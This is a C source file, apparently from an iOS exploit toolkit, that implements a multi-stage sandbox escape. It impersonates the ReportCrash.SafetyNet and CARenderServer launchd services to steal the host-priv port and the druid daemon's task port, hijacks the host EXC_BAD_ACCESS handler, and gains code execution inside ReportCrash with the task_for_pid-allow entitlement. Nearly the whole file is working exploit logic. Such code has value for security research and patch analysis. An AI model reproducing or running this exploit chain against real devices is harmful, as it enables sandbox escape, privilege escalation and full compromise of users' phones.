#include "sandbox_escape/sandbox_escape.h"

#include "backboardd/carenderserver.h"
#include "druid/druid.h"
#include "headers/sandbox.h"
#include "launchd/launchd_service.h"
#include "launchd_portrep/launchd_portrep.h"
#include "log/log.h"
#include "reportcrash/reportcrash.h"
#include "sandbox_escape/exception_server.h"
#include "sandbox_escape/mach_message.h"
#include "sandbox_escape/mach_service_mitm.h"
#include "sandbox_escape/threadexec_routines.h"

#include <assert.h>
#include <dispatch/dispatch.h>
#include <stddef.h>
#include <unistd.h>

#define REPORTCRASH_NAME	"ReportCrash"
#define SAFETYNET_NAME		"SafetyNet"
#define CARENDERSERVER_NAME	"CARenderServer"
#define DRUID_NAME		"druid"
#define EXCEPTION_NAME		"EXC_BAD_ACCESS"

// ---- Helper routines ---------------------------------------------------------------------------

// Try to extract the host-priv port from the task. Warnings are generated if the given task does
// not have the host-priv port.
static mach_port_t
task_extract_host_priv(mach_port_t task) {
	const char *warning_msg;
	// Extract the task's host port. This works because task_get_special_port() takes a
	// task_inspect right, which we're allowed to use.
	mach_port_t task_host;
	kern_return_t kr = task_get_special_port(task, TASK_HOST_PORT, &task_host);
	if (kr != KERN_SUCCESS) {
		warning_msg = "Could not extract host port from task 0x%x (pid %d)";
		goto fail_0;
	}
	// Now check if this is a host-priv port.
	kernel_boot_info_t boot_info;
	kr = host_get_boot_info(task_host, boot_info);
	if (kr != KERN_SUCCESS) {
		warning_msg = "Task 0x%x (pid %d) does not have host-priv port";
		goto fail_1;
	}
	// Success!
	return task_host;
fail_1:
	mach_port_deallocate(mach_task_self(), task_host);
fail_0:;
	int pid = -1;
	pid_for_task(task, &pid);
	if (pid == -1) {
		WARNING("Mach port 0x%x is not a task port", task);
	} else {
		WARNING(warning_msg, task, pid);
	}
	return MACH_PORT_NULL;
}

// Start the druid daemon, printing a warning on failure.
static void
start_druid() {
	bool ok = druid_start();
	if (!ok) {
		WARNING("Could not start %s", DRUID_NAME);
	}
}

// Crash the druid daemon, printing a warning on failure.
static void
crash_druid() {
	bool ok = druid_crash();
	if (!ok) {
		WARNING("Could not crash %s", DRUID_NAME);
	}
}

// Check if the specified port represents an unsandboxed task.
static bool
task_is_unsandboxed(mach_port_t task) {
	// First check if this is a task.
	int pid = -1;
	pid_for_task(task, &pid);
	if (pid < 0) {
		return false;
	}
	// It is a task! Now check if it is unsandboxed.
	int ret = sandbox_check(pid, NULL, 0);
	if (ret != 0) {
		return false;
	}
	// It is unsandboxed!
	return true;
}

// Restore a send right in launchd's IPC space.
static bool
restore_launchd_send_right(threadexec_t threadexec, task_t launchd_task_remote,
		mach_port_t service_port_name, mach_port_t *current_service_receive,
		mach_port_t original_service_send, unsigned srcount) {
	assert(srcount >= 1);
	// First insert the new_port send right into the threadexec.
	mach_port_t original_service_send_remote;
	bool ok = threadexec_mach_port_insert(threadexec, original_service_send,
			&original_service_send_remote, MACH_MSG_TYPE_COPY_SEND);
	if (!ok) {
		ERROR("Could not insert port 0x%x into task", original_service_send);
		goto fail_0;
	}
	// Now call mach_port_destroy() to destroy the receive right. This will cause launchd to
	// deregister the service currently using that name.
	mach_port_destroy(mach_task_self(), *current_service_receive);
	*current_service_receive = MACH_PORT_NULL;
	// Call mach_port_insert_right() to put the original Mach port back under the original
	// name.
	ok = threadexec_task_mach_port_insert_right(threadexec, launchd_task_remote,
			service_port_name, original_service_send_remote, MACH_MSG_TYPE_MOVE_SEND);
	if (!ok) {
		goto fail_1;
	}
	// Call mach_port_mod_refs() to set the desired uref count. If we fail, don't deallocate
	// the remote port again.
	ok = threadexec_task_mach_port_mod_refs(threadexec, launchd_task_remote, service_port_name,
			MACH_PORT_RIGHT_SEND, srcount - 1);
	if (!ok) {
		goto fail_0;
	}
	// Perfect, we're all set!
	return true;
fail_1:
	threadexec_mach_port_deallocate(threadexec, original_service_send_remote);
fail_0:
	return false;
}

// Restore the launchd service port that was replaced by the exploit.
static bool
restore_launchd_service(threadexec_t threadexec, mach_port_t launchd_task_remote,
		const char *service_name, mach_port_t *fake_service, mach_port_t real_service,
		unsigned srcount) {
	// Our strategy is as follows: First we find launchd's name for the fake service port. Then
	// we deallocate that port in launchd's task and insert the correct port back into launchd
	// using the same name.
	mach_port_t service_port_name;
	bool ok = threadexec_task_get_send_right_name(threadexec, launchd_task_remote,
			*fake_service, &service_port_name);
	if (!ok) {
		return false;
	}
	DEBUG_TRACE(2, "Launchd port name for %s: 0x%x", service_name, service_port_name);
	// Launchd services tend to have 2 send references.
	ok = restore_launchd_send_right(threadexec, launchd_task_remote,
			service_port_name, fake_service, real_service, srcount);
	if (!ok) {
		return false;
	}
	// Finally check that looking up the service gives the original service port.
	mach_port_t new_service = launchd_lookup_service(service_name);
	mach_port_deallocate(mach_task_self(), new_service);
	if (new_service != real_service) {
		ERROR("Failed to replace launchd service port for %s", service_name);
		DEBUG_TRACE(1, "Real service is 0x%x, fake service is 0x%x, "
				"after replacement we have 0x%x",
				real_service, fake_service, new_service);
	}
	return true;
}

// ---- The exploit -------------------------------------------------------------------------------

// Context for the sandbox escape functions.
struct sandbox_escape_context {
	mach_port_t reportcrash_service;
	mach_port_t safetynet_service;
	reportcrash_keepalive_assertion_t safetynet_assertion;
	mach_port_t fake_safetynet_service;
	mach_port_t host_priv;
	mach_port_t carenderserver_service;
	mach_port_t fake_carenderserver_service;
	mach_port_t druid_task;
	mach_port_t host_exception_handler;
	exception_behavior_t host_exception_behavior;
	thread_state_flavor_t host_exception_flavor;
	mach_port_t new_host_exception_handler;
	threadexec_t druid_tx;
	bool new_host_exception_handler_installed;
	mach_port_t reportcrash_task;
	mach_port_t reportcrash_thread;
	threadexec_t reportcrash_tx;
	bool system_unstable;
};

// Exploit stage 1: Get the host-priv port by impersonating ReportCrash.SafetyNet and then crashing
// ReportCrash.
static bool
get_host_priv(struct sandbox_escape_context *context) {
	// Get send rights to the ReportCrash and ReportCrash.SafetyNet services.
	mach_port_t reportcrash = launchd_lookup_service(REPORTCRASH_SERVICE_NAME);
	if (reportcrash == MACH_PORT_NULL) {
		ERROR("Could not connect to %s", REPORTCRASH_NAME);
		return false;
	}
	context->reportcrash_service = reportcrash;
	mach_port_t safetynet = launchd_lookup_service(REPORTCRASH_SAFETYNET_SERVICE_NAME);
	if (safetynet == MACH_PORT_NULL) {
		ERROR("Could not connect to %s", SAFETYNET_NAME);
		return false;
	}
	context->safetynet_service = safetynet;
	DEBUG_TRACE(1, "ReportCrash = 0x%x, SafetyNet = 0x%x", reportcrash, safetynet);
	// Keep SafetyNet alive and kickstart it to ensure it's running. We need to be sure that
	// launchd has given away its receive right to the SafetyNet service port before we can
	// proceed with the port replacement.
	reportcrash_keepalive_assertion_t safetynet_assertion = reportcrash_keepalive(safetynet);
	if (safetynet_assertion == 0) {
		ERROR("Could not generate a keepalive assertion for %s", SAFETYNET_NAME);
		return false;
	}
	context->safetynet_assertion = safetynet_assertion;
	bool ok = reportcrash_kickstart(safetynet, NULL);
	if (!ok) {
		WARNING("Could not kickstart %s", SAFETYNET_NAME);
	}
	// Replace SafetyNet with our own fake service in launchd.
	mach_port_t real_safetynet, fake_safetynet;
	ok = launchd_replace_service_port(REPORTCRASH_SAFETYNET_SERVICE_NAME,
			&real_safetynet, &fake_safetynet);
	if (!ok) {
		ERROR("Could not impersonate %s", SAFETYNET_NAME);
		return false;
	}
	context->fake_safetynet_service = fake_safetynet;
	assert(real_safetynet == safetynet);
	mach_port_deallocate(mach_task_self(), real_safetynet);
	INFO("Impersonating %s!", SAFETYNET_NAME);
	// Ok, now any instance of ReportCrash that starts up and crashes will send us its task
	// port. Existing instances, however, will continue to send exception messages to the real
	// SafetyNet. And ReportCrash is likely to be running because of launchd_portrep_crasher.
	// So, force ReportCrash to exit so that it starts up again and launchd sends it our fake
	// SafetyNet port.
	ok = reportcrash_exit(reportcrash);
	if (!ok) {
		WARNING("Could not exit %s", REPORTCRASH_NAME);
	}
	// Send another message to cause ReportCrash to crash, triggering the exception message.
	// Note that due to how ReportCrash configures its exception handlers, we will only get
	// ReportCrash's task port once it's already in EXC_CRASH, not when the original
	// EXC_BAD_ACCESS exception is generated.
	INFO("Crashing %s", REPORTCRASH_NAME);
	ok = reportcrash_crash(reportcrash, false);
	if (!ok) {
		WARNING("Could not crash %s", REPORTCRASH_NAME);
	}
	// Now listen for the exception message from the kernel containing ReportCrash's task port.
	// ReportCrash will be kept alive but suspended until we reply (implicitly, at the end of
	// this block).
	ok = catch_exception_server(fake_safetynet, 30 * NSEC_PER_SEC, ^bool (
				mach_port_t            thread,
				mach_port_t            task,
				exception_type_t       exception,
				exception_data_t       code,
				mach_msg_type_number_t codeCnt,
				kern_return_t *        result) {
		// We have an exception message containing a task port. Almost certainly this is
		// ReportCrash. Extract the host-priv port and reply with KERN_FAILURE.
		context->host_priv = task_extract_host_priv(task);
		*result = KERN_FAILURE;
		// Don't process any more blocks.
		return true;
	});
	// Handle a timeout.
	if (!ok) {
		ERROR("Timed out while listening for exception message on our fake %s port",
				SAFETYNET_NAME);
		return false;
	}
	// Check if we got the host-priv port.
	if (context->host_priv == MACH_PORT_NULL) {
		ERROR("Could not get the host-priv port");
		return false;
	}
	// Alright, we have the host-priv port!
	INFO("Got host-priv port 0x%x!", context->host_priv);
	return true;
}

// Exploit stage 2: Get the task port for an unsandboxed process, in this case the druid daemon.
static bool
get_druid_task(struct sandbox_escape_context *context) {
	// Get a send right to the real com.apple.CARenderServer service.
	mach_port_t carenderserver = launchd_lookup_service(CARENDERSERVER_SERVICE_NAME);
	if (carenderserver == MACH_PORT_NULL) {
		ERROR("Could not connect to %s", CARENDERSERVER_NAME);
		return false;
	}
	context->carenderserver_service = carenderserver;
	// Replace CARenderServer with our own fake service in launchd. If the port is freed the
	// system will be unstable.
	context->system_unstable = true;
	mach_port_t real_carenderserver, fake_carenderserver;
	bool ok = launchd_replace_service_port(CARENDERSERVER_SERVICE_NAME,
			&real_carenderserver, &fake_carenderserver);
	if (!ok) {
		ERROR("Could not impersonate %s", CARENDERSERVER_NAME);
		return false;
	}
	context->fake_carenderserver_service = fake_carenderserver;
	assert(real_carenderserver == carenderserver);
	mach_port_deallocate(mach_task_self(), real_carenderserver);
	INFO("Impersonating %s!", CARENDERSERVER_NAME);
	// Now fake_carenderserver will be sent to any processes that look up CARenderServer in
	// launchd. We need to start a thread to MITM that service so that we can inspect messages
	// for task ports. Here we create the context for the server, which will be shared only for
	// the duration of this function.
	__block struct {
		mach_port_t task_port;
		dispatch_semaphore_t have_task_port;
	} mitm_context;
	mitm_context.task_port = MACH_PORT_NULL;
	mitm_context.have_task_port = dispatch_semaphore_create(0);
	assert(mitm_context.have_task_port != NULL);
	// Start the MITM server in another thread. It will continue to run after this function has
	// returned, since we don't want to break the system. :) We will repair the damage at a
	// later point, once we have launchd's task port.
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
		// Run the MITM server until the fake_carenderserver port is destroyed.
		mach_mitm_server(carenderserver, fake_carenderserver,
				^bool (mach_msg_header_t *msg) {
			DEBUG_TRACE(2, "New message 0x%x from PID %u",
					msg->msgh_id, mach_message_get_pid(msg));
			// We have a new message on the fake_carenderserver port. If the task_port
			// slot is empty, try to fill it with a task port from the message.
			if (mitm_context.task_port == MACH_PORT_NULL) {
				// Search the message for task ports.
				__block mach_port_t task = MACH_PORT_NULL;
				mach_message_inspect_ports(msg, ^bool (mach_port_t port) {
					if (task_is_unsandboxed(port)) {
						task = port;
						return true;
					}
					return false;
				});
				// If we found a task, add a reference to it (since sending will
				// remove a reference), store it in the MITM context for retrieval,
				// and signal the semaphore.
				if (task != MACH_PORT_NULL) {
					kern_return_t kr = mach_port_mod_refs(mach_task_self(),
							task, MACH_PORT_RIGHT_SEND, 1);
					assert(kr == KERN_SUCCESS);
					mitm_context.task_port = task;
					dispatch_semaphore_signal(mitm_context.have_task_port);
				}
			}
			// Forward the message.
			return true;
		});
		// By the time we exit the MITM server the fake service port has been destroyed, so
		// no one else has a reference to the MITM context. Release the task port and free
		// the semaphore.
		DEBUG_TRACE(1, "Exiting MITM server");
		mach_port_deallocate(mach_task_self(), mitm_context.task_port);
		dispatch_release(mitm_context.have_task_port);
	});
	// Ok, now any program that starts up and sends its task port to CARenderServer will
	// instead send its task port to us. However, we won't get the task port unless the program
	// freshly starts up. We are targeting druid, the drag UI daemon, which may already be
	// running. Thus, we will try twice: if we don't get the task port after a few seconds, we
	// will restart druid.
	start_druid();
	long result = dispatch_semaphore_wait(mitm_context.have_task_port,
			dispatch_time(DISPATCH_TIME_NOW, 4 * NSEC_PER_SEC));
	if (result == 0) {
		goto got_task;
	}
	// We didn't get it the first time, so maybe druid was already running. Restart it and try
	// again.
	INFO("Crashing and restarting %s", DRUID_NAME);
	crash_druid();
	start_druid();
	result = dispatch_semaphore_wait(mitm_context.have_task_port,
			dispatch_time(DISPATCH_TIME_NOW, 12 * NSEC_PER_SEC));
	if (result != 0) {
		ERROR("Timed out while trying to get task port for %s", DRUID_NAME);
		return false;
	}
	// Alright, we got the task port! Set the task port in the MITM context to MACH_PORT_DEAD
	// so that the MITM server doesn't search for more ports.
got_task:
	INFO("Got task port for %s! 0x%x", DRUID_NAME, mitm_context.task_port);
	context->druid_task = mitm_context.task_port;
	mitm_context.task_port = MACH_PORT_DEAD;
	return true;
}

// Exploit stage 3: Save the current host exception port info for EXC_BAD_ACCESS, then use druid to
// install a new host-level exception handler for EXC_BAD_ACCESS to which we have the receive
// right.
static bool
set_host_exception_port(struct sandbox_escape_context *context) {
	// First try to save the current host exception handler for EXC_BAD_ACCESS, so that we can
	// restore it later.
	exception_mask_t mask;
	mach_msg_type_number_t count = 1;
	kern_return_t kr = host_get_exception_ports(
			context->host_priv,
			EXC_MASK_BAD_ACCESS,
			&mask,
			&count,
			&context->host_exception_handler,
			&context->host_exception_behavior,
			&context->host_exception_flavor);
	if (kr != KERN_SUCCESS) {
		WARNING("Could not save host's %s exception handler", EXCEPTION_NAME);
	}
	// Now create a receive right that will be the new host-level exception handler for
	// EXC_BAD_ACCESS.
	mach_port_t new_exception_handler;
	kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
			&new_exception_handler);
	assert(kr == KERN_SUCCESS);
	kr = mach_port_insert_right(mach_task_self(), new_exception_handler,
			new_exception_handler, MACH_MSG_TYPE_MAKE_SEND);
	assert(kr == KERN_SUCCESS);
	context->new_host_exception_handler = new_exception_handler;
	// Create a threadexec context for druid so that we can execute code in its context. We
	// kill the task after we're done so that druid gets the correct CARenderServer port.
	threadexec_t druid_tx = threadexec_init(context->druid_task, MACH_PORT_NULL,
			TX_KILL_TASK | TX_BORROW_TASK_PORT);
	if (druid_tx == NULL) {
		ERROR("Could not create execution context in %s (task 0x%x)",
				DRUID_NAME, context->druid_task);
		return false;
	}
	context->druid_tx = druid_tx;
	// Now use the execution context to set the host exception port.
	bool ok = threadexec_host_set_exception_ports(
			druid_tx,
			context->host_priv,
			EXC_MASK_BAD_ACCESS,
			new_exception_handler,
			EXCEPTION_DEFAULT,
			ARM_UNIFIED_THREAD_STATE);
	if (!ok) {
		ERROR("Could not set the host exception handler for %s", EXCEPTION_NAME);
		return false;
	}
	INFO("Set the host exception handler for %s", EXCEPTION_NAME);
	context->new_host_exception_handler_installed = true;
	return true;
}

// Exploit stage 4: Trigger EXC_BAD_ACCESS in ReportCrash in order to get its task and thread
// ports. We need to do this again because the first set of ports were suspended by the kernel
// during process exit.
static bool
get_reportcrash_task(struct sandbox_escape_context *context) {
	// Keep ReportCrash alive. We will use this keepalive assertion to crash ReportCrash as
	// well.
	mach_port_t reportcrash = context->reportcrash_service;
	reportcrash_keepalive_assertion_t reportcrash_assertion
		= reportcrash_keepalive(reportcrash);
	if (reportcrash_assertion == 0) {
		ERROR("Could not generate keepalive assertion for %s", REPORTCRASH_NAME);
		return false;
	}
	// Get ReportCrash's PID.
	pid_t reportcrash_pid = -1;
	bool ok = reportcrash_kickstart(reportcrash, &reportcrash_pid);
	if (!ok) {
		WARNING("Could not get %s PID", REPORTCRASH_NAME);
	}
	// Release the assertion to trigger an EXC_BAD_ACCESS exception in ReportCrash.
	reportcrash_keepalive_assertion_release(reportcrash_assertion);
	// Now listen for an exception from ReportCrash on our host exception handler port.
	ok = catch_exception_server(context->new_host_exception_handler,
			30 * NSEC_PER_SEC, ^bool (
				mach_port_t            thread,
				mach_port_t            task,
				exception_type_t       exception,
				exception_data_t       code,
				mach_msg_type_number_t codeCnt,
				kern_return_t *        result) {
		// We have an exception message containing a task port. Check that this is really
		// ReportCrash.
		int crashing_pid = -1;
		pid_for_task(task, &crashing_pid);
		if (crashing_pid != reportcrash_pid && reportcrash_pid != -1) {
			// Nope, not ReportCrash. Tell the kernel we aren't handling this
			// exception.
			DEBUG_TRACE(1, "Got crash from unknown process %d", crashing_pid);
			*result = KERN_FAILURE;
			return false;
		}
		// This is ReportCrash. Suspend the thread so that it doesn't crash again and
		// reply with KERN_SUCCESS. This will keep the task and thread ports live (MIG
		// semantics). Also, because the thread remains suspended, it still serves to keep
		// ReportCrash from exiting.
		context->reportcrash_task = task;
		context->reportcrash_thread = thread;
		kern_return_t kr = thread_suspend(thread);
		if (kr != KERN_SUCCESS) {
			WARNING("Could not suspend %s thread 0x%x", REPORTCRASH_NAME, thread);
		}
		*result = KERN_SUCCESS;
		return true;
	});
	// If we timed out, fail.
	if (!ok) {
		ERROR("Timed out while listening for exception message on our host %s port",
				EXCEPTION_NAME);
		return false;
	}
	assert(context->reportcrash_task != MACH_PORT_NULL
			&& context->reportcrash_thread != MACH_PORT_NULL);
	// We got ReportCrash's task port!
	INFO("Got %s task 0x%x, pid %d!", REPORTCRASH_NAME, context->reportcrash_task,
			reportcrash_pid);
	return true;
}

// Exploit stage 5: Restore the original EXC_BAD_ACCESS host exception port, again using druid.
static void
restore_host_exception_port(struct sandbox_escape_context *context) {
	bool ok = threadexec_host_set_exception_ports(
			context->druid_tx,
			context->host_priv,
			EXC_MASK_BAD_ACCESS,
			context->host_exception_handler,
			context->host_exception_behavior,
			context->host_exception_flavor);
	if (!ok) {
		WARNING("Could not restore the host exception handler for %s",
				EXCEPTION_NAME);
	} else {
		INFO("Restored host %s handler", EXCEPTION_NAME);
	}
	context->new_host_exception_handler_installed = false;
}

// Exploit stage 6: Create an execution context in ReportCrash and restore the original send rights
// to ReportCrash.SafetyNet and CARenderServer in launchd.
static bool
fix_exploit_damage(struct sandbox_escape_context *context) {
	// Create an execution context in ReportCrash. We've mangled the thread we crashed earlier,
	// so just kill ReportCrash when done.
	threadexec_t reportcrash_tx = threadexec_init(context->reportcrash_task,
			context->reportcrash_thread, TX_KILL_TASK);
	if (reportcrash_tx == NULL) {
		ERROR("Could not create execution context in %s", REPORTCRASH_NAME);
		// The task and thread ports will be deallocated in clear_context().
		return false;
	}
	// Great! Now we can call functions in a process with task_for_pid-allow.
	INFO("Created execution context in %s", REPORTCRASH_NAME);
	context->reportcrash_tx = reportcrash_tx;
	// Get launchd's task port in ReportCrash.
	mach_port_t launchd_task_remote;
	bool ok = threadexec_task_for_pid_remote(reportcrash_tx, 1, &launchd_task_remote);
	if (!ok) {
		ERROR("Could not get launchd's task port");
		return false;
	}
	bool success = false;
	// Replace launchd's send right for CARenderServer, which actually points to our fake
	// CARenderServer port, so that it once again points back to the real CARenderServer.
	ok = restore_launchd_service(reportcrash_tx, launchd_task_remote,
			CARENDERSERVER_SERVICE_NAME, &context->fake_carenderserver_service,
			context->carenderserver_service, 2);
	if (!ok) {
		ERROR("Could not restore service %s", CARENDERSERVER_NAME);
		goto fail_1;
	}
	INFO("Restored service %s", CARENDERSERVER_NAME);
	// Replace launchd's send right for SafetyNet, which actually points to our fake SafetyNet
	// port, so that it once again points back to the real SafetyNet.
	ok = restore_launchd_service(reportcrash_tx, launchd_task_remote,
			REPORTCRASH_SAFETYNET_SERVICE_NAME, &context->fake_safetynet_service,
			context->safetynet_service, 2);
	if (!ok) {
		ERROR("Could not restore service %s", SAFETYNET_NAME);
		goto fail_1;
	}
	INFO("Restored service %s", SAFETYNET_NAME);
	// Success! The system should be stable again.
	context->system_unstable = false;
	success = true;
fail_1:
	// Free launchd's task port in RemoteCrash.
	threadexec_mach_port_deallocate(reportcrash_tx, launchd_task_remote);
	return success;
}

// Clean up all resources from the exploit.
static void
clear_context(struct sandbox_escape_context *context) {
	// Clear state from get_reportcrash_task().
	if (context->reportcrash_tx == NULL) {
		thread_resume(context->reportcrash_thread);
		mach_port_deallocate(mach_task_self(), context->reportcrash_task);
		mach_port_deallocate(mach_task_self(), context->reportcrash_thread);
	}
	// Clear state from set_host_exception_port().
	if (context->new_host_exception_handler_installed) {
		restore_host_exception_port(context);
	}
	if (context->druid_tx != NULL) {
		threadexec_deinit(context->druid_tx);
	}
	mach_port_destroy(mach_task_self(), context->new_host_exception_handler);
	mach_port_deallocate(mach_task_self(), context->host_exception_handler);
	// Clear state from get_druid_task().
	mach_port_deallocate(mach_task_self(), context->druid_task);
	mach_port_destroy(mach_task_self(), context->fake_carenderserver_service);
	mach_port_deallocate(mach_task_self(), context->carenderserver_service);
	// Clear state from get_host_priv().
	mach_port_deallocate(mach_task_self(), context->host_priv);
	mach_port_destroy(mach_task_self(), context->fake_safetynet_service);
	if (context->safetynet_assertion != 0) {
		reportcrash_keepalive_assertion_release(context->safetynet_assertion);
	}
	mach_port_deallocate(mach_task_self(), context->safetynet_service);
	mach_port_deallocate(mach_task_self(), context->reportcrash_service);
}

// Aaaaand putting it all together...
threadexec_t
sandbox_escape() {
	DEBUG_TRACE(1, "%s", __func__);
	struct sandbox_escape_context context = {};
	// The first step is to get the host-priv port using launchd-portrep. This is the safest
	// part of the exploit since we'll replace com.apple.ReportCrash.SafetyNet, which is not
	// meaningfully used. We also get the fake service port and the keepalive assertion on
	// SafetyNet, since we don't want it to die until after we've fixed its port in launchd.
	bool ok = get_host_priv(&context);
	if (!ok) {
		goto fail;
	}
	// The next step is to use the launchd-portrep vulnerability again to get the task port for
	// an unsandboxed process (at any privilege level). We'll target druid, the DragUI daemon,
	// which is unsandboxed and runs as the user mobile. druid sends its task port to the
	// com.apple.CARenderServer service, which is run by backboardd.
	ok = get_druid_task(&context);
	if (!ok) {
		goto fail;
	}
	// We now have an unsandboxed task and the host-priv port, so the natural next step is to
	// combine them! We'll use threadexec to insert the host-priv port into the unsandboxed
	// task and set the host exception port for EXC_BAD_ACCESS.
	ok = set_host_exception_port(&context);
	if (!ok) {
		goto fail;
	}
	// Now any process that crashes with EXC_BAD_ACCESS (and also doesn't have a thread/task
	// exception handler, which is most processes) will send us its task and thread port! Let's
	// crash ReportCrash (again). This time ReportCrash won't be suspended, so we can actually
	// use the task and thread ports to execute code.
	ok = get_reportcrash_task(&context);
	if (!ok) {
		goto fail;
	}
	// Restore the host's EXC_BAD_ACCESS exception port, since we now have a task port for a
	// process with the task_for_pid-allow entitlement.
	restore_host_exception_port(&context);
	// Use ReportCrash to fix up the exploit damage.
	ok = fix_exploit_damage(&context);
	if (!ok) {
		// We may have obtained an execution context but failed to fix launchd. The system
		// is likely to be unstable, but continue anyway.
		ERROR("Failed to fix the damage caused by the exploit");
	}
	// Now we can use ReportCrash to execute arbitrary code with the task_for_pid-allow
	// entitlement. ;)
fail:
	clear_context(&context);
	if (context.system_unstable) {
		ERROR("The system is likely to be unstable");
	}
	DEBUG_TRACE(1, "%s: done", __func__);
	return context.reportcrash_tx;
}
